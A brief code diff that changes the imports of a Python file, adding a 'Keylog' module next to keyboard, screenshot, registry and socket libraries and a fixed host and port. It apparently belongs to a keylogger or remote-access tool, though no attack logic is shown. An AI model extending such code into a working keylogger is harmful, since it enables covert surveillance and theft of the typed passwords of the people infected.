@@ -1,6 +1,5 @@
 import socket
 import threading
-import json
 import winreg
 import pyautogui
 import io
@@ -16,6 +15,7 @@ from ipaddress import ip_address
 from contextlib import closing
 import pynput.keyboard
 import Program
+import Keylog
 
 HOST = "127.0.1.1"
 PORT = 64444
